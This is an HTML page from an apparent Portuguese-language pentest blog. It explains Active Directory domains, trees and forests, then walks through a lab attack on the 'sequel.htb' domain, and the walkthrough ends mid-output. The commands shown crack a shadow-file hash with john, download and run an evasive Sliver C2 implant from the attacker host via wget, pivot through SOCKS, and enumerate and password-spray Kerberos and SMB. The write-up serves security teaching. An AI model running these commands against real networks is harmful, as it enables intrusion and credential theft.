@@ -1,0 +1,542 @@
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+
+    body {
+        background-color: black;
+        color: white;
+    }
+
+    * {
+        font-family: 'VT323', monospace;
+    }
+    
+
+    img {
+      max-width: 50%;
+      height: auto;
+      display: block;
+    }
+
+</style>
+
+<pre>
+
+    <center>
+ <img src="../../static/tumblr_oeupnhMT8e1vi4eyho1_500-893520843.gif" alt="ad" style="width: 40%; height: auto;">   
+</center>
+</pre><p>Date: 2024-04-08 Tags: Pentest, ADCS, RedTeam Category: security</p>
+<p>O Active Directory (<strong>AD</strong>) é uma ferramenta para administradores de redes, permitindo a criação e gerenciamento de domínios, usuários e objetos dentro de uma rede corporativa. Por meio do AD, é possível conectar todas as maquinas
+em um servidor DC (<strong>Domain Controler</strong>) ele que autentifica os usuários por meio do protocolo kerberos.</p>
+<p><strong><em>Por exemplo</em></strong>, um administrador pode criar um grupo de usuários dentro do domínio corp.local e conceder a eles privilégios específicos para acessar pastas ou sistemas internos. À medida que a rede cresce, o Active Directory facilita a organização de grandes volumes de usuários e dispositivos em grupos lógicos, garantindo um controle refinado sobre permissões e acessos.</p>
+<p>O Active Directory é organizado da seguinte forma:</p>
+<p>1) <strong>Domínio</strong> (Domain)<br>2) <strong>Árvore</strong> (Tree)<br>3) <strong>Floresta</strong> (Forest)  </p>
+<h2 id="2-1-dom-nio-domain-">2.1 Domínio (Domain)</h2>
+<p>Um domínio é um agrupamento lógico de objetos (usuários, computadores, impressoras, etc.) que compartilham um mesmo banco de dados. Todos os recursos dentro de um domínio seguem as regras estabelecidas pelo administrador.</p>
+<p><strong><em>Exemplo:</em></strong> O domínio <code>corp.local</code> pode conter usuários como <span style='color: yellow;'><em>joao@corp.local</em></span>, <span style='color: yellow;'><em>ana@corp.local</em></span> e dispositivos como <span style='color: yellow;'><em>servidor1.corp.local</em></span>.</p>
+<h2 id="2-2-rvore-tree-">2.2 Árvore (Tree)</h2>
+<p>Uma árvore é um conjunto de domínios que compartilham um espaço de nomes contínuo. Dentro da árvore, os domínios têm relações hierárquicas e de confiança entre si.</p>
+<p>Exemplo: Dentro da árvore corp.local, podemos ter domínios secundários como:  </p>
+<ul>
+<li><em><strong>ti.corp.local</strong></em> (para a equipe de TI)  </li>
+<li><em><strong>financeiro.corp.local</strong></em> (para o departamento financeiro)  </li>
+<li><em><strong>marketing.corp.local</strong></em> (para o time de marketing)  </li>
+</ul>
+<h2 id="2-3-floresta-forest-">2.3 Floresta (Forest)</h2>
+<p>A floresta representa o nível mais alto da hierarquia do <code>Active Directory</code>. Ela é composta por múltiplas árvores que compartilham um esquema e uma configuração de segurança comuns, mas podem ter domínios distintos e independentes.</p>
+<p>Exemplo: Uma empresa multinacional pode conter uma floresta contendo diferentes árvores:  </p>
+<ul>
+<li><em><strong>corp.local</strong></em> (para a matriz)  </li>
+<li><em><strong>europe.corp.local</strong></em> (para operações na Europa)  </li>
+<li><em><strong>asia.corp.local</strong></em> (para operações na Ásia)  </li>
+</ul>
+<h1 id="reconhecimento">Reconhecimento</h1>
+<p>Em um cenario no qual um atacante consegue comprometer um entry point dentro da rede alvo 
+seja explorando algum serviço aberto para internet, obtendo senhas de vpn ou por enviando phising
+o processo de reconhecimento interno é iniciado, o objetivo em questão é comprometer o DC <strong>a.k.a</strong> <code>Domain Controler</code> 
+e se tornar <code>Domain Admin</code>.</p>
+<p>No nosso cenario hipotetico o servidor &quot;<strong><em>server-501</em></strong>&quot; é usado como pivoting para a rede.</p>
+<pre><code class="lang-bash">[root<span class="hljs-symbol">@server</span><span class="hljs-number">-501</span>]<span class="hljs-meta"># lastlog</span>
+root             tty1                 <span class="hljs-number">5</span>                             Fri Mar  <span class="hljs-number">7</span> <span class="hljs-number">11</span>:<span class="hljs-number">20</span>:<span class="hljs-number">55</span> <span class="hljs-number">-0600</span> <span class="hljs-number">2025</span>
+bin                                                                 **Never logged <span class="hljs-keyword">in</span>**
+daemon                                                              **Never logged <span class="hljs-keyword">in</span>**
+adm                                                                 **Never logged <span class="hljs-keyword">in</span>**
+lp                                                                  **Never logged <span class="hljs-keyword">in</span>**
+sync                                                                **Never logged <span class="hljs-keyword">in</span>**
+<span class="hljs-built_in">shutdown</span>                                                            **Never logged <span class="hljs-keyword">in</span>**
+halt                                                                **Never logged <span class="hljs-keyword">in</span>**
+mail                                                                **Never logged <span class="hljs-keyword">in</span>**
+postfix                                                             **Never logged <span class="hljs-keyword">in</span>**
+gdm              tty1                                               Wed Jun <span class="hljs-number">12</span> <span class="hljs-number">15</span>:<span class="hljs-number">33</span>:<span class="hljs-number">27</span> <span class="hljs-number">-0600</span> <span class="hljs-number">2024</span>
+sshd                                                                **Never logged <span class="hljs-keyword">in</span>**
+chrony                                                              **Never logged <span class="hljs-keyword">in</span>**
+tcpdump                                                             **Never logged <span class="hljs-keyword">in</span>**
+rose             pts/<span class="hljs-number">3</span>    <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.252</span>                              Sat Nov  <span class="hljs-number">9</span> <span class="hljs-number">12</span>:<span class="hljs-number">21</span>:<span class="hljs-number">01</span> <span class="hljs-number">-0600</span> <span class="hljs-number">2024</span>
+mysql                                                               **Never logged <span class="hljs-keyword">in</span>**
+nginx                                                               **Never logged <span class="hljs-keyword">in</span>**
+zabbix                                                              **Never logged <span class="hljs-keyword">in</span>**
+</code></pre>
+<p>O usuário rose logou na maquina em <strong>Novembro de 2024</strong>
+essa informação vai ser util para nós.<br>Vamos quebrar a hash do usuário rose: </p>
+<pre><code class="lang-bash">[root@server-<span class="hljs-number">501</span>]# cat /etc/passwd<span class="hljs-comment">; echo "\r\n" ; cat /etc/shadow </span>
+<span class="hljs-symbol">
+root@kali:</span> /home/Documents
+# unshadow passwd shadow &gt; unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+KxEPkKe6R8su            (rose)
+
+
+// obtendo as rotas 
+[root@server-<span class="hljs-number">501</span>]# route                                                                                                                
+Kernel <span class="hljs-built_in">IP</span> routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+<span class="hljs-meta">default</span>         <span class="hljs-number">10.10</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>       <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>         UG    <span class="hljs-number">100</span>    <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0
+<span class="hljs-number">10.10</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>       <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>         <span class="hljs-number">255.255</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>     U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0
+<span class="hljs-number">172.17</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>      <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>         <span class="hljs-number">255.255</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>     U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> docker0
+
+// enumerando
+root@server-<span class="hljs-number">501</span># ./nmap -sn <span class="hljs-number">10.10</span><span class="hljs-meta">.0</span>-<span class="hljs-number">255.1</span>/<span class="hljs-number">24</span> | grep report | cut -d <span class="hljs-string">' '</span> -f <span class="hljs-number">5</span> 
+<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.2</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.3</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.10</span><span class="hljs-meta">.245</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.10</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.24</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.31</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.37</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.38</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.39</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.40</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.41</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.42</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.43</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.44</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.45</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.46</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.47</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.48</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.49</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.50</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.1</span>
+<span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.227</span>
+</code></pre>
+<p>Como podemos ver a rota principal da rede é <code>10.10.0.0/16</code>.<br>Antes de começarmos a enumerar os serviços vamos iniciar nosso <a href="https://sliver.sh/"><code>C2 Sliver</code></a> </p>
+<pre><code class="lang-bash">root@kali: /home/kali/Documents
+# service sliver start                                                                                                              
+
+root@kali: /home/kali/Documents
+# sliver                                                                                                                            
+Connecting <span class="hljs-keyword">to</span> localhost:<span class="hljs-number">31337</span> ...
+
+██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
+▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
+░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
+▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
+▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
+▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
+░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
+░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
+   ░      ░  ░ ░        ░     ░  ░   ░
+
+All hackers gain recover
+[*] Server v1.<span class="hljs-number">5.42</span> - <span class="hljs-number">235230</span>d05ec472851023dbcb871ddee2eb9e3df
+[*] Welcome <span class="hljs-keyword">to</span> the sliver shell, please <span class="hljs-keyword">type</span> <span class="hljs-string">'help'</span> <span class="hljs-keyword">for</span> options
+
+[*] Check <span class="hljs-keyword">for</span> updates <span class="hljs-keyword">with</span> the <span class="hljs-string">'update'</span> command
+
+sliver &gt;  
+
+<span class="hljs-comment">// nosso objetivo aqui é criar uma carga util sliver para o sistema linux para facilitar o pivoting</span>
+
+sliver &gt; mtls 
+
+[*] Starting mTLS listener ...
+[*] Successfully started job <span class="hljs-string">#1</span>
+
+sliver &gt; jobs 
+
+ID   <span class="hljs-keyword">Name</span>   Protocol   Port   Stage Profile 
+==== ====== ========== ====== ===============
+<span class="hljs-number">1</span>    mtls   tcp        <span class="hljs-number">8888</span>                 
+
+sliver &gt; generate --mtls <span class="hljs-number">10.10</span>.<span class="hljs-number">14.227</span>:<span class="hljs-number">8888</span> --os linux --arch amd64 --evasion --format elf --save /tmp --seconds <span class="hljs-number">5</span> --jitter <span class="hljs-number">3</span>
+
+[*] Generating new linux/amd64 beacon implant binary (<span class="hljs-number">5</span>s)
+[*] Symbol obfuscation <span class="hljs-keyword">is</span> enabled
+[*] Build completed <span class="hljs-keyword">in</span> <span class="hljs-number">21</span>s
+[*] Implant saved <span class="hljs-keyword">to</span> /tmp/CLASSIC_JUDGE
+
+<span class="hljs-comment">//baixando para a maquina</span>
+[root@server-<span class="hljs-number">501</span>]# wget <span class="hljs-number">10.10</span>.<span class="hljs-number">14.227</span>/CLASSIC_JUDGE -O /tmp/xfile ; chmod +x /tmp/xfile; /tmp/xfile &amp;   <span class="hljs-comment">// carga util do sliver</span>
+
+<span class="hljs-comment">// conexão recebida</span>
+[*] Beacon a42ca296 CLASSIC_JUDGE - <span class="hljs-number">10.10</span>.<span class="hljs-number">14.227</span>:<span class="hljs-number">32876</span> (server-<span class="hljs-number">501</span>) - linux/amd64 - Sat, <span class="hljs-number">02</span> Mar <span class="hljs-number">2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">25</span>:<span class="hljs-number">13</span> EST
+sliver &gt; use a42ca296
+[*] Active beacon CLASSIC_JUDGE (a42ca296-<span class="hljs-number">7</span>f35-<span class="hljs-number">4379</span>-<span class="hljs-number">8</span>d47-c42dba27ef64)
+
+<span class="hljs-comment">// vamos iniciar um socks proxy para nos comunicarmos com a rede interna</span>
+sliver (CLASSIC_JUDGE) &gt;socks5 start
+[*] Started SOCKS5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1081</span>
+<span class="hljs-keyword">In</span>-band SOCKS proxies can be a little unstable depending <span class="hljs-keyword">on</span> protocol
+</code></pre>
+<p>perfeito agora podemos começar a enumerar os <strong>smbs</strong> e <strong>windows</strong> da rede</p>
+<pre><code class="lang-bash"><span class="hljs-selector-tag">root</span>@<span class="hljs-selector-tag">kali</span>: /<span class="hljs-selector-tag">home</span>/<span class="hljs-selector-tag">kali</span>/<span class="hljs-selector-tag">Documents</span>
+# <span class="hljs-selector-tag">proxychains</span> <span class="hljs-selector-tag">-q</span> <span class="hljs-selector-tag">netexec</span> <span class="hljs-selector-tag">smb</span> <span class="hljs-selector-tag">hosts</span><span class="hljs-selector-class">.txt</span>                                                                                                                     
+<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.11</span><span class="hljs-selector-class">.51</span>     <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">SERVER-473</span>             <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">10</span> / <span class="hljs-selector-tag">Server</span> <span class="hljs-selector-tag">2022</span> <span class="hljs-selector-tag">Build</span> <span class="hljs-selector-tag">19282</span> <span class="hljs-selector-tag">x64</span> (<span class="hljs-attribute">name</span>:DC) (<span class="hljs-attribute">domain</span>:sequel.htb) (<span class="hljs-attribute">signing</span>:True) (<span class="hljs-attribute">SMBv1</span>:False)
+<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.11</span><span class="hljs-selector-class">.51</span>     <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">DC</span>             <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">10</span> / <span class="hljs-selector-tag">Server</span> <span class="hljs-selector-tag">2022</span> <span class="hljs-selector-tag">Build</span> <span class="hljs-selector-tag">19282</span> <span class="hljs-selector-tag">x64</span> (<span class="hljs-attribute">name</span>:DC) (<span class="hljs-attribute">domain</span>:sequel.htb) (<span class="hljs-attribute">signing</span>:True) (<span class="hljs-attribute">SMBv1</span>:False)
+<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.11</span><span class="hljs-selector-class">.39</span>     <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">SERVER-301</span>               <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">10</span> / <span class="hljs-selector-tag">Server</span> <span class="hljs-selector-tag">2016</span> <span class="hljs-selector-tag">Build</span> <span class="hljs-selector-tag">11825</span> <span class="hljs-selector-tag">x64</span> (<span class="hljs-attribute">name</span>:SERVER-<span class="hljs-number">301</span>) (<span class="hljs-attribute">domain</span>:sequel.htb) (<span class="hljs-attribute">signing</span>:True) (<span class="hljs-attribute">SMBv1</span>:False)                                                                                                                               
+<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.11</span><span class="hljs-selector-class">.41</span>     <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">SERVER-95</span>             <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">10</span> / <span class="hljs-selector-tag">Server</span> <span class="hljs-selector-tag">2012</span> <span class="hljs-selector-tag">Build</span> <span class="hljs-selector-tag">26201</span> <span class="hljs-selector-tag">x64</span> (<span class="hljs-attribute">name</span>:SERVER-<span class="hljs-number">95</span>) (<span class="hljs-attribute">domain</span>:sequel.htb) (<span class="hljs-attribute">signing</span>:True) (<span class="hljs-attribute">SMBv1</span>:False)                                                                                                                              
+<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.11</span><span class="hljs-selector-class">.24</span>     <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">SERVER-451</span>             <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">Server</span> <span class="hljs-selector-tag">2022</span> <span class="hljs-selector-tag">Build</span> <span class="hljs-selector-tag">20348</span> <span class="hljs-selector-tag">x64</span> (<span class="hljs-attribute">name</span>:SERVER-<span class="hljs-number">451</span>) (<span class="hljs-attribute">domain</span>:sequel.htb) (<span class="hljs-attribute">signing</span>:True) (<span class="hljs-attribute">SMBv1</span>:False)                                                                                                                                       
+<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.11</span><span class="hljs-selector-class">.42</span>     <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">SERVER-651</span>               <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">Server</span> <span class="hljs-selector-tag">2022</span> <span class="hljs-selector-tag">Build</span> <span class="hljs-selector-tag">20348</span> <span class="hljs-selector-tag">x64</span> (<span class="hljs-attribute">name</span>:SERVER-<span class="hljs-number">651</span>) (<span class="hljs-attribute">domain</span>:sequel.htb) (<span class="hljs-attribute">signing</span>:True) (<span class="hljs-attribute">SMBv1</span>:False)
+<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.11</span><span class="hljs-selector-class">.31</span>     <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">SERVER-152</span>             <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">10</span> / <span class="hljs-selector-tag">Server</span> <span class="hljs-selector-tag">2019</span> <span class="hljs-selector-tag">Build</span> <span class="hljs-selector-tag">17763</span> <span class="hljs-selector-tag">x64</span> (<span class="hljs-attribute">name</span>:<span class="hljs-number">152</span>) (<span class="hljs-attribute">domain</span>:sequel.htb) (<span class="hljs-attribute">signing</span>:True) (<span class="hljs-attribute">SMBv1</span>:False)                                                                                                                            
+<span class="hljs-selector-tag">SMB</span>         <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.3</span>      <span class="hljs-selector-tag">445</span>    <span class="hljs-selector-tag">LAME</span>             <span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Unix</span> (<span class="hljs-attribute">name</span>:LAME) (<span class="hljs-attribute">domain</span>:sequel.htb) (<span class="hljs-attribute">signing</span>:False) (<span class="hljs-attribute">SMBv1</span>:True)
+</code></pre>
+<p>Podemos ver que o ip do <strong>DomainControler</strong> é  <code>10.10.11.51</code></p>
+<pre><code class="lang-bash">root@server-<span class="hljs-number">501</span># ./nmap -v <span class="hljs-comment">--open -sS -sV 10.10.11.51</span>
+
+<span class="hljs-keyword">PORT</span>     STATE SERVICE       VERSION
+<span class="hljs-number">53</span>/tcp   <span class="hljs-keyword">open</span>  domain        Simple DNS Plus
+<span class="hljs-number">88</span>/tcp   <span class="hljs-keyword">open</span>  kerberos-sec  Microsoft Windows Kerberos (server <span class="hljs-built_in">time</span>: <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">08</span> <span class="hljs-number">23</span>:<span class="hljs-number">56</span>:<span class="hljs-number">36</span>Z)
+<span class="hljs-number">135</span>/tcp  <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">139</span>/tcp  <span class="hljs-keyword">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
+<span class="hljs-number">389</span>/tcp  <span class="hljs-keyword">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: <span class="hljs-keyword">Default</span>-First-Site-Name)
+<span class="hljs-number">445</span>/tcp  <span class="hljs-keyword">open</span>  microsoft-ds?
+<span class="hljs-number">464</span>/tcp  <span class="hljs-keyword">open</span>  kpasswd5?
+<span class="hljs-number">593</span>/tcp  <span class="hljs-keyword">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span>
+<span class="hljs-number">636</span>/tcp  <span class="hljs-keyword">open</span>  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: <span class="hljs-keyword">Default</span>-First-Site-Name)
+<span class="hljs-number">1433</span>/tcp <span class="hljs-keyword">open</span>  ms-sql-s      Microsoft SQL Server <span class="hljs-number">2019</span> <span class="hljs-number">15.00</span>.<span class="hljs-number">2000</span>
+<span class="hljs-number">3268</span>/tcp <span class="hljs-keyword">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: <span class="hljs-keyword">Default</span>-First-Site-Name)
+<span class="hljs-number">3269</span>/tcp <span class="hljs-keyword">open</span>  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: <span class="hljs-keyword">Default</span>-First-Site-Name)
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre>
+<p>lembra da <strong>senha da rose</strong> que pegamos? vamos tentar usar ela </p>
+<pre><code class="lang-bash">root@server<span class="hljs-number">-501</span><span class="hljs-comment"># ./kerbrute userenum -d sequel.htb --dc 10.10.11.51 usuários.txt                           </span>
+
+__             __               __     
+/ <span class="hljs-regexp">/_____  _____/</span> <span class="hljs-regexp">/_  _______  __/</span> /____ 
+/ <span class="hljs-regexp">//</span>_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+/ ,&lt; /  __/ /  / <span class="hljs-regexp">/_/</span> / /  / <span class="hljs-regexp">/_/</span> / <span class="hljs-regexp">/_/</span>  __/
+<span class="hljs-regexp">/_/</span>|_|\___<span class="hljs-regexp">/_/</span>  <span class="hljs-regexp">/_.___/_/</span>   \__,_<span class="hljs-regexp">/\__/</span>\___/                                        
+
+Version: v1<span class="hljs-number">.0</span><span class="hljs-number">.3</span> (<span class="hljs-number">9</span>dad6e1) - <span class="hljs-number">03</span>/<span class="hljs-number">08</span>/<span class="hljs-number">25</span> - Ronnie Flathers @ropnop
+
+<span class="hljs-number">2025</span>/<span class="hljs-number">03</span>/<span class="hljs-number">08</span> <span class="hljs-number">19</span>:<span class="hljs-number">18</span>:<span class="hljs-number">53</span> &gt;  Using KDC(s):
+<span class="hljs-number">2025</span>/<span class="hljs-number">03</span>/<span class="hljs-number">08</span> <span class="hljs-number">19</span>:<span class="hljs-number">18</span>:<span class="hljs-number">53</span> &gt;   <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.51</span>:<span class="hljs-number">88</span>
+
+<span class="hljs-number">2025</span>/<span class="hljs-number">03</span>/<span class="hljs-number">08</span> <span class="hljs-number">19</span>:<span class="hljs-number">18</span>:<span class="hljs-number">53</span> &gt;  [+] VALID USERNAME:       administrator@sequel.htb
+<span class="hljs-number">2025</span>/<span class="hljs-number">03</span>/<span class="hljs-number">08</span> <span class="hljs-number">19</span>:<span class="hljs-number">18</span>:<span class="hljs-number">53</span> &gt;  [+] VALID USERNAME:       rose@sequel.htb
+<span class="hljs-number">2025</span>/<span class="hljs-number">03</span>/<span class="hljs-number">08</span> <span class="hljs-number">19</span>:<span class="hljs-number">18</span>:<span class="hljs-number">53</span> &gt;  Done! Tested <span class="hljs-number">14</span> usernames (<span class="hljs-number">2</span> valid) <span class="hljs-keyword">in</span> <span class="hljs-number">0.449</span> seconds
+
+<span class="hljs-regexp">//</span> o usuário rose existe <span class="hljs-literal">no</span> domínio isso é bom para nós
+
+root@server<span class="hljs-number">-501</span><span class="hljs-comment"># ./kerbrute passwordspray -d sequel.htb --dc 10.10.11.51 usuários.txt "KxEPkKe6R8su"</span>
+
+__             __               __     
+/ <span class="hljs-regexp">/_____  _____/</span> <span class="hljs-regexp">/_  _______  __/</span> /____ 
+/ <span class="hljs-regexp">//</span>_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+/ ,&lt; /  __/ /  / <span class="hljs-regexp">/_/</span> / /  / <span class="hljs-regexp">/_/</span> / <span class="hljs-regexp">/_/</span>  __/
+<span class="hljs-regexp">/_/</span>|_|\___<span class="hljs-regexp">/_/</span>  <span class="hljs-regexp">/_.___/_/</span>   \__,_<span class="hljs-regexp">/\__/</span>\___/                                        
+
+Version: v1<span class="hljs-number">.0</span><span class="hljs-number">.3</span> (<span class="hljs-number">9</span>dad6e1) - <span class="hljs-number">03</span>/<span class="hljs-number">08</span>/<span class="hljs-number">25</span> - Ronnie Flathers @ropnop
+
+<span class="hljs-number">2025</span>/<span class="hljs-number">03</span>/<span class="hljs-number">08</span> <span class="hljs-number">19</span>:<span class="hljs-number">20</span>:<span class="hljs-number">09</span> &gt;  Using KDC(s):
+<span class="hljs-number">2025</span>/<span class="hljs-number">03</span>/<span class="hljs-number">08</span> <span class="hljs-number">19</span>:<span class="hljs-number">20</span>:<span class="hljs-number">09</span> &gt;   <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.51</span>:<span class="hljs-number">88</span>
+
+<span class="hljs-number">2025</span>/<span class="hljs-number">03</span>/<span class="hljs-number">08</span> <span class="hljs-number">19</span>:<span class="hljs-number">20</span>:<span class="hljs-number">10</span> &gt;  [+] VALID LOGIN:  rose@sequel.htb:KxEPkKe6R8su
+<span class="hljs-number">2025</span>/<span class="hljs-number">03</span>/<span class="hljs-number">08</span> <span class="hljs-number">19</span>:<span class="hljs-number">20</span>:<span class="hljs-number">10</span> &gt;  Done! Tested <span class="hljs-number">14</span> logins (<span class="hljs-number">1</span> successes) <span class="hljs-keyword">in</span> <span class="hljs-number">0.903</span> seconds
+
+<span class="hljs-regexp">//</span> e para nossa sorte a senha bate com as credenciais <span class="hljs-keyword">do</span> linux
+<span class="hljs-regexp">//</span> porem não temos privilegios 
+
+
+root@kali: /home/kali/Documents
+<span class="hljs-comment"># proxychains -q netexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su -d sequel.htb                                                                     [19:20:10]</span>
+SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.51</span>     <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.51</span>     <span class="hljs-number">445</span>    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
+</code></pre>
+<p>Vamos começar nossa enumeração de usuários</p>
+<pre><code class="lang-bash"><span class="hljs-symbol">root@kali:</span> /home/kali/Documents
+# proxychains -q netexec smb <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span> -u rose -p KxEPkKe6R8su -d sequel.htb --users --rid-brute --shares                                        [<span class="hljs-number">19</span>:<span class="hljs-number">22</span>:<span class="hljs-number">05</span>]
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             [*] Enumerated shares
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             Share           Permissions     Remark
+SMB         <span class="hljs-number">10.10</span><span class="hljs-meta">.11</span><span class="hljs-meta">.51</span>     <span class="hljs-number">445</span>    DC01             -----           -----------     ------
